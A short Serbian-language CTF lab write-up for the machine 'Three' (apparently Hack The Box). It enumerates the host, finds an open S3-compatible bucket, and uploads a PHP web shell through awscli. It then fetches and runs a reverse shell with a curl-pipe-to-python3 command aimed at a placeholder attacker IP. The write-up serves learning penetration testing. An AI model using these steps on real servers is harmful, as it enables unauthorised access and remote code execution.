# Machine : Three

## Cilj
- Pronaci flag

## Enumeracija
- nmap pronalazi 22/ssh i 80/http
- dodajemo thetoppers.htb uz IP u /etc/hosts da bi pristupili sajtu
- ffuf ne pronalazi znacajnije direktorijume
- za potrebe subdomain pretrage preuzet seclists. Sajt salje lazni kod 200, uz -mc all i -fc 200
  pronadjen subdomain s3 (Amazon S3, cloud servis za cuvanje fajlova na internetu) 
  //fajlovi se cuvaju u bucketima, koristi se awscli

## Eksploatacija
- dodajemo s3.thetoppers.htb u /etc/hosts
- aws s3 ls --endpoint=http://s3.thetoppers.htb //ls lista buckete na custom domenu. Mora se staviti 
  --endpoint jer nije "pravi" amazonov servis 
- pronadjen 'thetoppers.htb' bucket
- sad kad imamo bucket trazimo sta sve ima unutra: aws s3 ls s3://thetoppers.htb --endpoint=[sajt]
- stavke se cuvaju u images folderu, sajt koristi php
- pravimo PHP web shell za slanje komandi serveru preko browsera(URL) // web_shell.php
- ubacujemo je na server putem cp komande // 
  aws s3 cp web_shell.php s3://thetoppers.htb --endpoint=[sajt]
- http://thetoppers.htb/web_shell.php?cmd=whoami // www-data(user)
- sada mozemo ubaciti reverse shell za pristup serveru
- pokrecemo server na nasem racunaru i nc za slusanje
- ...?cmd=curl+[IP_ADRESA]:[PORT]/reverse_shell.py|python3
- Uspesno povezani!
- Uz par cd .. i ls nalazimo flag.txt u /var/www i root flag

## Nauceno
- Amazon S3 servisi i awscli upotreba
- upotreba web shella
